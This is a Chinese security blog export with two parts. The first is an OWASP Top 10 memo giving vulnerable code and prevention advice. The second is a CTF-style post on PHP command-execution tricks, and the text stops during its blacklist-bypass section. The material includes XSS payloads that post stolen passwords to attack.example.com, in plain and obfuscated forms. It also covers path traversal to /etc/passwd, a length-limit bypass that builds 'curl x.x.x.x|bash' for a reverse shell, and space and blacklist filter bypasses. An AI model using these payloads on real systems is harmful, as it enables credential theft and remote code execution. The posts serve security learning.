<p>该程序将生成如下的配置文件路径名：</p>
<pre class="language-none"><code class="language-none">&#x2F;users&#x2F;cwe&#x2F;profiles&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</code></pre>

<p>打开文件后，操作系统会在路径规范化期间解析“ ../”，并实际访问此文件：</p>
<pre class="language-none"><code class="language-none">&#x2F;etc&#x2F;passwd</code></pre>

<p>结果，攻击者可以阅读密码文件的整个文本</p>
<h4 id="Prevent-4"><a href="#Prevent-4" class="headerlink" title="Prevent"></a>Prevent</h4><ol>
<li>除公共资源外，默认情况下拒绝</li>
<li>一次实施访问控制机制，并在整个应用程序中重复使用它们，包括最大程度地减少<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Access_control_CORS">CORS</a>的使用。</li>
<li>禁用Web服务器目录列表，并确保Web根目录中不存在文件元数据（例如.git）和备份文件。</li>
<li>限速API和控制器访问权限，以最大程度减少自动攻击工具带来的危害。</li>
</ol>
<h3 id="安全配置错误"><a href="#安全配置错误" class="headerlink" title="安全配置错误"></a>安全配置错误</h3><h4 id="简介-5"><a href="#简介-5" class="headerlink" title="简介"></a>简介</h4><p>安全配置错误是比较常见的漏洞，由于操作者的不当配置(默认配置，临时配置，开源云存储，http标头配置，以及包含敏感信息的详细错误)，导致攻击者可以利用这些配置获取到更高的权限，安全配置错误可以发生在各个层面，包含平台、web服务器、应用服务器、数据库、架构和代码。</p>
<h4 id="Example-5"><a href="#Example-5" class="headerlink" title="Example"></a>Example</h4><pre class="language-java" data-language="java"><code class="language-java"><span class="token class-name">Properties</span> prop <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Properties</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
prop<span class="token punctuation">.</span><span class="token function">load</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">FileInputStream</span><span class="token punctuation">(</span><span class="token string">"config.properties"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">String</span> password <span class="token operator">=</span> prop<span class="token punctuation">.</span><span class="token function">getProperty</span><span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token class-name">DriverManager</span><span class="token punctuation">.</span><span class="token function">getConnection</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> usr<span class="token punctuation">,</span> password<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>以下代码从属性文件中读取密码，并使用该密码连接到数据库。</p>
<p>该代码将成功运行，但是有权访问config.properties的任何人都可以读取密码的值。如果攻击者有权访问此信息，则可以使用它来入侵系统。</p>
<p>参考：<a href="https://cwe.mitre.org/data/definitions/256.html">CWE-256: Unprotected Storage of Credentials</a></p>
<h4 id="Prevent-5"><a href="#Prevent-5" class="headerlink" title="Prevent"></a>Prevent</h4><ol>
<li>自动化安装部署，保证开发，QA，产品环境的配置尽量相同，减少部署一个新安全环境的耗费，</li>
<li>及时了解并部署每个环境的软件更新和补丁信息</li>
<li>使用提供有效分离的安全性强大的应用程序架构</li>
<li>实施漏洞扫描和安全审计，以帮助检查错误的配置或者未安装的补丁</li>
</ol>
<p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration">A6：2017-安全性错误配置</a></p>
<h3 id="跨站点脚本（XSS）"><a href="#跨站点脚本（XSS）" class="headerlink" title="跨站点脚本（XSS）"></a>跨站点脚本（XSS）</h3><h4 id="简介-6"><a href="#简介-6" class="headerlink" title="简介"></a>简介</h4><p>xss攻击全称为<a href="https://baike.baidu.com/item/XSS攻击/954065?fr=aladdin">跨站脚本攻击</a>,当应用程序的新网页中包含不受信任的、未经恰当验证、转义的数据或可以使用HTML、JavaScript的浏览器API更新的现有网页时，就会出现xss漏洞，跨站脚本攻击是最普遍的web应用安全漏洞，甚至在某些安全平台都存在xss漏洞。xss会执行攻击者在浏览器中执行的脚本，并劫持用户会话，破坏网站或用户重定向到恶意站点，使用xss还可以执行拒绝服务攻击。</p>
<h4 id="Example-6"><a href="#Example-6" class="headerlink" title="Example"></a>Example</h4><h5 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h5><pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;div class="header"> Welcome, '</span> <span class="token operator">.</span> <span class="token variable">$username</span> <span class="token operator">.</span> <span class="token string single-quoted-string">'&lt;/div>'</span><span class="token punctuation">;</span></code></pre>

<p>以上代码基于HTTP GET用户名参数在网页上显示欢迎消息。</p>
<p>由于参数可以是任意的，因此可以修改页面的url，因此<code>$username</code>可以包含脚本语法，例如：</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//trustedSite.example.com/welcome.php?username=&lt;Script Language="Javascript">alert("You've been attacked!");&lt;/Script></span></span></code></pre>

<p>这样会弹出无害的警告对话框，最初这不是一个很大的漏洞，毕竟，为什么有人输入一个导致恶意代码在其自己的计算机上运行的URL？真正的危险在于，攻击者将创建恶意URL，然后使用电子邮件或社交工程技巧诱使受害者访问URL的链接。当受害者单击链接时，他们会通过易受攻击的Web应用程序不经意地将恶意内容反映回自己的计算机。更现实的是，攻击者可以在页面上嵌入一个伪造的登录框，诱使用户将用户的密码发送给攻击者：</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//trustedSite.example.com/welcome.php?username=&lt;div id="stealPassword">Please Login:&lt;form name="input" action="http://attack.example.com/stealPassword.php" method="post">Username: &lt;input type="text" name="username" />&lt;br/>Password: &lt;input type="password" name="password" />&lt;br/>&lt;input type="submit" value="Login" />&lt;/form>&lt;/div></span></span></code></pre>

<p>如果用户单击此链接，那么Welcome.php将生成以下HTML并将其发送到用户的浏览器：</p>
<pre class="language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>header<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> Welcome, <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>stealPassword<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> Please Login:
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>input<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>attack.example.com/stealPassword.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>
        Username: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>
        Password: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">/></span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>Login<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></code></pre>

<p>但是，精明的用户可能会注意到URL上附加了可疑文本。攻击者可能进一步混淆URL（以下示例链接分为多行以提高可读性）：</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//trustedSite.example.com/welcome.php?username=%3Cdiv+id%3D%22</span></span>
stealPassword%22%3EPlease+Login%3A%3Cform+name%3D%22input
%22+action%3D%22http%3A%2F%2Fattack.example.com%2FstealPassword.php
%22+method%3D%22post%22%3EUsername%3A+%3Cinput+type%3D%22text
%22+name%3D%22username%22+%2F%3E%3Cbr%2F%3EPassword%3A
+%3Cinput+type%3D%22password%22+name%3D%22password%22
+%2F%3E%3Cinput+type%3D%22submit%22+value%3D%22Login%22
+%2F%3E%3C%2Fform%3E%3C%2Fdiv%3E%0D%0A</code></pre>

<p>相同的攻击字符串也可能被混淆为：</p>
<pre class="language-http" data-language="http"><code class="language-http"><span class="token header"><span class="token header-name keyword">http</span><span class="token punctuation">:</span><span class="token header-value">//trustedSite.example.com/welcome.php?username=&lt;script+type="text/javascript"></span></span>
document.write('\u003C\u0064\u0069\u0076\u0020\u0069\u0064\u003D\u0022\u0073
\u0074\u0065\u0061\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064
\u0022\u003E\u0050\u006C\u0065\u0061\u0073\u0065\u0020\u004C\u006F\u0067
\u0069\u006E\u003A\u003C\u0066\u006F\u0072\u006D\u0020\u006E\u0061\u006D
\u0065\u003D\u0022\u0069\u006E\u0070\u0075\u0074\u0022\u0020\u0061\u0063
\u0074\u0069\u006F\u006E\u003D\u0022\u0068\u0074\u0074\u0070\u003A\u002F
\u002F\u0061\u0074\u0074\u0061\u0063\u006B\u002E\u0065\u0078\u0061\u006D
\u0070\u006C\u0065\u002E\u0063\u006F\u006D\u002F\u0073\u0074\u0065\u0061
\u006C\u0050\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u002E\u0070\u0068
\u0070\u0022\u0020\u006D\u0065\u0074\u0068\u006F\u0064\u003D\u0022\u0070
\u006F\u0073\u0074\u0022\u003E\u0055\u0073\u0065\u0072\u006E\u0061\u006D
\u0065\u003A\u0020\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079
\u0070\u0065\u003D\u0022\u0074\u0065\u0078\u0074\u0022\u0020\u006E\u0061
\u006D\u0065\u003D\u0022\u0075\u0073\u0065\u0072\u006E\u0061\u006D\u0065
\u0022\u0020\u002F\u003E\u003C\u0062\u0072\u002F\u003E\u0050\u0061\u0073
\u0073\u0077\u006F\u0072\u0064\u003A\u0020\u003C\u0069\u006E\u0070\u0075
\u0074\u0020\u0074\u0079\u0070\u0065\u003D\u0022\u0070\u0061\u0073\u0073
\u0077\u006F\u0072\u0064\u0022\u0020\u006E\u0061\u006D\u0065\u003D\u0022
\u0070\u0061\u0073\u0073\u0077\u006F\u0072\u0064\u0022\u0020\u002F\u003E
\u003C\u0069\u006E\u0070\u0075\u0074\u0020\u0074\u0079\u0070\u0065\u003D
\u0022\u0073\u0075\u0062\u006D\u0069\u0074\u0022\u0020\u0076\u0061\u006C
\u0075\u0065\u003D\u0022\u004C\u006F\u0067\u0069\u006E\u0022\u0020\u002F
\u003E\u003C\u002F\u0066\u006F\u0072\u006D\u003E\u003C\u002F\u0064\u0069\u0076\u003E\u000D');&lt;/script></code></pre>

<p>这两个攻击链接都将导致页面上显示伪造的登录框，并且用户更有可能忽略URL末尾的难以理解的文本。</p>
<h5 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h5><p>CreateUser.php</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$username</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$fullName</span> <span class="token operator">=</span> <span class="token function">mysql_real_escape_string</span><span class="token punctuation">(</span><span class="token variable">$fullName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$query</span> <span class="token operator">=</span> <span class="token function">sprintf</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'Insert Into users (username,password) Values ("%s","%s","%s")'</span><span class="token punctuation">,</span> <span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token function">crypt</span><span class="token punctuation">(</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$fullName</span><span class="token punctuation">)</span> <span class="token punctuation">;</span>
<span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>ListUsers.php</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'Select * From users Where loggedIn=true'</span><span class="token punctuation">;</span>
<span class="token variable">$results</span> <span class="token operator">=</span> <span class="token function">mysql_query</span><span class="token punctuation">(</span><span class="token variable">$query</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$results</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//Print list of users to page</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;div id="userlist">Currently Active Users:'</span><span class="token punctuation">;</span>
<span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysql_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$results</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
	<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;div class="userNames">'</span><span class="token operator">.</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'fullname'</span><span class="token punctuation">]</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/div>'</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;/div>'</span><span class="token punctuation">;</span></code></pre>

<p>以上的web应用程序由两个独立的页面组成，一个页面用于创建用户的账户，另外一个页面用于列出当前登录的活动用户</p>
<p>攻击者可以将其名称设置为任意HTML，然后将其显示给“活动用户”页面的所有访问者。该HTML例如可以是窃取登录消息的密码。</p>
<p>参考：<a href="https://cwe.mitre.org/data/definitions/79.html">CWE-79: Improper Neutralization of Input During Web Page Generation (‘Cross-site Scripting’)</a></p>
<h4 id="Prevent-6"><a href="#Prevent-6" class="headerlink" title="Prevent"></a>Prevent</h4><ol>
<li>使用设计上自动转义XSS的框架，例如最新的Ruby on Rails, React JS，了解每个框架的XSS保护的局限性，并适当处理未涵盖的用例</li>
<li>根据HTML输出中的上下文（正文，属性，JavaScript，CSS，或URL）转义不受信任的HTTP请求数据将解决XSS漏洞</li>
</ol>
<p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A7_2017-Cross-Site_Scripting_(XSS)">A7:2017-Cross-Site Scripting (XSS)</a></p>
<h3 id="不安全的反序列化"><a href="#不安全的反序列化" class="headerlink" title="不安全的反序列化"></a>不安全的反序列化</h3><h4 id="简介-7"><a href="#简介-7" class="headerlink" title="简介"></a>简介</h4><p>不安全的反序列化可以导致<a href="https://baike.baidu.com/item/远程代码执行漏洞/2491231?fr=aladdin">远程代码执行</a>、<a href="https://baike.baidu.com/item/重放攻击?fromtitle=重播攻击&fromid=19455997">重放攻击</a>、注入攻击或特权升级攻击</p>
<h4 id="Example-7"><a href="#Example-7" class="headerlink" title="Example"></a>Example</h4><p>参考本站：</p>
<ul>
<li><a href="https://www.extrader.top/posts/bb56c28a/">phar反序列化浅析</a></li>
<li><a href="https://www.extrader.top/posts/488d0f65/">python反序列化漏洞浅析</a></li>
<li><a href="https://www.extrader.top/posts/d3333ead/">ctf-反序列化</a></li>
</ul>
<h4 id="Prevent-7"><a href="#Prevent-7" class="headerlink" title="Prevent"></a>Prevent</h4><ol>
<li>在所有序列化对象上实施完整性检查，例如数字签名，以防止恶意创建对象或篡改数据。</li>
<li>在对象创建之前的反序列化过程中强制执行严格的类型约束，因为代码通常希望使用一组可定义的类。</li>
<li>隔离并运行可能在低特权环境中反序列化的代码。</li>
</ol>
<p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A8_2017-Insecure_Deserialization">A8:2017-Insecure Deserialization</a></p>
<h3 id="使用含有已知漏洞的组件"><a href="#使用含有已知漏洞的组件" class="headerlink" title="使用含有已知漏洞的组件"></a>使用含有已知漏洞的组件</h3><h4 id="简介-8"><a href="#简介-8" class="headerlink" title="简介"></a>简介</h4><p><a href="https://baike.baidu.com/item/组件/6902128?fr=aladdin">组件</a>(eg：库、框架或其他软件模块)拥有应用程序相同的权限，如果应用程序中含有已知漏洞，攻击者可以利用漏洞获取数据或接管服务器。同时，使用这些组件会破坏应用程序防御，造成各种攻击产生严重的后果。</p>
<h4 id="Example-8"><a href="#Example-8" class="headerlink" title="Example"></a>Example</h4><p>参考本站：</p>
<ul>
<li><a href="https://www.extrader.top/posts/67caa546/">CTF-CVE</a></li>
</ul>
<p>漏洞查找：</p>
<p><a href="https://www.cvedetails.com/version-search.php">MITER常见漏洞和披露（CVE）搜索</a></p>
<p><a href="https://nvd.nist.gov/">NVD漏洞数据库</a></p>
<h4 id="Prevent-8"><a href="#Prevent-8" class="headerlink" title="Prevent"></a>Prevent</h4><ol>
<li>使用诸如<a href="https://www.mojohaus.org/versions-maven-plugin/">version</a>，<a href="https://owasp.org/www-project-dependency-check">DependencyCheck</a>，<a href="https://github.com/retirejs/retire.js/">retire.js</a>等工具，连续清点客户端和服务器端组件（例如，框架，库）的<a href="https://www.mojohaus.org/versions-maven-plugin/">版本</a>及其依赖<a href="https://github.com/retirejs/retire.js/">项</a>。持续监视<a href="https://cve.mitre.org/">CVE</a>和<a href="https://nvd.nist.gov/">NVD</a>等来源的组件中的漏洞。使用软件组成分析工具来自动化该过程。订阅电子邮件警报以获取与您使用的组件相关的安全漏洞。</li>
<li>仅通过安全链接从官方来源获取组件。优先选择经过签名的软件包，以减少包含经过修改的恶意组件的机会。</li>
<li>监视未维护的库和组件或未为旧版本创建安全补丁的组件。如果无法修补，请考虑部署<a href="https://owasp.org/www-community/Virtual_Patching_Best_Practices">虚拟修补程序</a>以监视，检测或防止发现的问题。</li>
</ol>
<p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A9_2017-Using_Components_with_Known_Vulnerabilities">A9:2017-Using Components with Known Vulnerabilities</a></p>
<h3 id="不足的日志记录和监控"><a href="#不足的日志记录和监控" class="headerlink" title="不足的日志记录和监控"></a>不足的日志记录和监控</h3><h4 id="简介-9"><a href="#简介-9" class="headerlink" title="简介"></a>简介</h4><p>不足的日志记录和监控，以及事件响应缺失或无效的集成，使攻击者能够进一步攻击系统、保持持续性的或攻击更多的系统，以及对数据的不当操作。</p>
<h4 id="Example-9"><a href="#Example-9" class="headerlink" title="Example"></a>Example</h4><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">function</span> <span class="token function-definition function">login</span><span class="token punctuation">(</span><span class="token variable">$userName</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">authenticate</span><span class="token punctuation">(</span><span class="token variable">$userName</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    	<span class="token keyword">return</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token function">incrementLoginAttempts</span><span class="token punctuation">(</span><span class="token variable">$userName</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">recentLoginAttempts</span><span class="token punctuation">(</span><span class="token variable">$userName</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        	<span class="token function">writeLog</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Failed login attempt by User: "</span> <span class="token operator">.</span> <span class="token variable">$userName</span> <span class="token operator">.</span> <span class="token string double-quoted-string">" at "</span> <span class="token operator">+</span> <span class="token function">date</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'r'</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>以上代码记录可疑的多次登录尝试。</p>
<p>此代码仅在达到特定限制时记录失败的登录尝试。如果攻击者知道此限制，则可以通过避免该限制来阻止发现攻击。</p>
<p>参考：<a href="https://cwe.mitre.org/data/definitions/223.html">CWE-223: Omission of Security-relevant Information</a></p>
<h4 id="Prevent-9"><a href="#Prevent-9" class="headerlink" title="Prevent"></a>Prevent</h4><ol>
<li>确保可以使用足够的用户上下文记录所有登录，访问控制失败和服务器端输入验证失败的事件，以识别可疑或恶意帐户，并保留足够的时间以进行处理。</li>
<li>确保以一种集中式日志管理解决方案可以轻松使用的格式生成日志。</li>
<li>确保高价值交易具有完整性控制的审计跟踪，以防止篡改或删除，例如仅追加数据库表或类似内容。</li>
<li>建立有效的监视和警报，以便及时发现并应对可疑活动。</li>
<li>建立或采用事件响应和恢复计划，例如<a href="https://csrc.nist.gov/publications/detail/sp/800-61/rev-2/final">NIST 800-61 rev 2</a>或更高版本。</li>
</ol>
<p>参考：<a href="https://owasp.org/www-project-top-ten/2017/A10_2017-Insufficient_Logging%2526Monitoring">A10:2017-Insufficient Logging &amp; Monitoring</a></p>
<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul>
<li><a href="https://owasp.org/www-project-top-ten/2017/Top_10">OWASP Top 10 Application Security Risks - 2017</a></li>
<li><a href="https://blog.csdn.net/wang_624/article/details/89683571">OWASP Top 10 简单介绍</a></li>
</ul>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>Owasp</tag>
      </tags>
  </entry>
  <entry>
    <title>php命令执行小技巧</title>
    <url>/posts/45c7e77/</url>
    <content><![CDATA[<span id="more"></span>

<h2 id="突破命令长度限制"><a href="#突破命令长度限制" class="headerlink" title="突破命令长度限制"></a><strong>突破命令长度限制</strong></h2><p>限制条件：长度<strong>&lt;=4</strong></p>
<p>限制代码：</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">show_source</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
     <span class="token keyword">echo</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
     <span class="token keyword">echo</span> <span class="token string double-quoted-string">"hack!!!"</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span></code></pre>

<h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a><strong>命令执行</strong></h3><p>先看效果图：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/girls/image-20200814204553709.png" alt loading="lazy"></p>
<p><strong>原理</strong></p>
<ol>
<li><code>&gt;</code>后面跟的文件名，可以生成一个以这个字符串命名的文件</li>
<li><code>*</code>可以将文件名（按首字母排序）列出来当一行命令执行</li>
<li><code>*v</code>匹配当前目录下以<code>v</code>结尾的的文件名，<code>*v</code>=<code>rev v</code>，输出<code>v</code>文件内容里面内容的反序结果，<code>&gt;cat|*t</code>同理</li>
<li><code>dir a b&gt;c</code>只会将<code>a b</code>写到文件<code>c</code>中</li>
</ol>
<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a><strong>反弹shell</strong></h3><p>先看效果图：</p>
<p>获取<code>ls -th &gt;g</code>命令</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/girls/image-20200814220444746.png" alt loading="lazy"></p>
<p>获取<code>curl x.x.x.x|bash</code>命令</p>
<p><code>&gt;cu\\</code>这里看着是5个字符，超过了4个的限制，实际上是因为 shell环境需要输入<code>\\</code>产生<code>\</code>，但是<code>php</code> 代码<code>exec</code>时，只需要输入<code>\</code>即可产生<code>\</code>，比如 <code>exec(&quot;&gt;cu\&quot;)</code>即可。所以这里实际上是不超过4个字符的，为了演示直观，在<code>shell</code>中直接执行</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/girls/image-20200814223956562.png" alt loading="lazy"></p>
<p>执行结果：</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/girls/image-20200814221328388.png" alt loading="lazy"></p>
<p><strong>原理</strong></p>
<ol>
<li><code>ls -t</code>按时间顺序排列文件，<code>ls -th</code>不影响命令执行，为了让倒序的时候<code>ht-</code>在<code>sl</code>前面</li>
<li><code>\</code>  <code>linux</code>下行末加上<code>\</code>会将该行末尾与下一行行首连接起来，简单来说应该是删掉了换行符</li>
</ol>
<p>这里需要注意，文件名中不能包含<code>/</code>这个符号的，所以需要将反弹shell的服务器根目录下默认网页设置成curl下反弹shell的命令的网页</p>
<p>例如我ubuntu服务器的Apache默认网页设置在<code>/etc/apache2/mods-available/dir.conf</code>中，编辑如下</p>
<p><img src="https://cdn.jsdelivr.net/gh/Extrader-home/blogimage@master/image/girls/image-20200814225408259.png" alt loading="lazy"></p>
<p>1.txt中为反弹shell的命令，这样即可成功执行</p>
<p>或者你改index.html的内容也行</p>
<h2 id="绕过空格"><a href="#绕过空格" class="headerlink" title="绕过空格"></a>绕过空格</h2><ul>
<li>${PS2} 对应字符 ‘&gt;’</li>
<li>${PS4} 对应字符 ‘+’</li>
<li>${IFS} 对应 内部字段分隔符</li>
<li>${9} 对应 空字符串</li>
</ul>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span>
linux@Extrader:/var/www/html$ <span class="token function">cat</span> /flag
flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>
linux@Extrader:/var/www/html$ <span class="token function">cat</span><span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span>/flag
flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>
linux@Extrader:/var/www/html$ <span class="token function">cat</span><span class="token variable">$&#123;<span class="token environment constant">IFS</span>&#125;</span><span class="token variable">$9</span>/flag
flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>
linux@Extrader:/var/www/html$ <span class="token function">cat</span><span class="token environment constant">$IFS</span><span class="token variable">$9</span>/flag
flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span>

php下可以cat%09/flag

<span class="token operator">&lt;></span>
linux@Extrader:/var/www/html$ cat<span class="token operator">&lt;</span>/flag
flag<span class="token punctuation">&#123;</span>3e23f43-235tg54-2d4t54g-43e3ed23e<span class="token punctuation">&#125;</span></code></pre>

<h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><pre class="language-bash" data-language="bash"><code class="language-bash">拼接
linux@Extrader:/var/www/html$ <span class="token assign-left variable">a</span><span class="token operator">=</span>c<span class="token punctuation">;</span><span class="token assign-left variable">b</span><span class="token operator">=</span>at<span class="token punctuation">;</span><span class="token assign-left variable">c</span><span class="token operator">=</span>/flag<span class="token punctuation">;</span><span class="token variable">$a</span><span class="token variable">$b</span> <span class="token variable">$c</span>
